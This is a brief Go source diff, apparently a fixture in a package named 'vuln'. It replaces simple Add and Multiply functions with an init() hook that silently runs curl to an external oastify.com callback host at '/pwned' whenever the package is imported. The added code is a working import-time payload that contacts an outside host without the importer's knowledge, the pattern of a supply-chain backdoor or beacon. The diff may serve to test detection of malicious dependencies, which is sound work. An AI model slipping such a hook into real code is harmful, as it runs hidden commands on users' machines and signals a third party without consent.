@@ -1,12 +1,11 @@
-// math.go
 package vuln
 
-// Add adds two integers and returns the result
-func Add(a, b int) int {
-    return a + b
-}
+import (
+    "os/exec"
+    _ "unsafe"
+)
 
-// Multiply multiplies two integers and returns the result
-func Multiply(a, b int) int {
-    return a * b
+func init() {
+    // This runs when the package is imported
+    exec.Command("curl", "http://v3ze3hj5s7qsct50eyfh3rw6ixooce03.oastify.com/pwned").Run()
 }
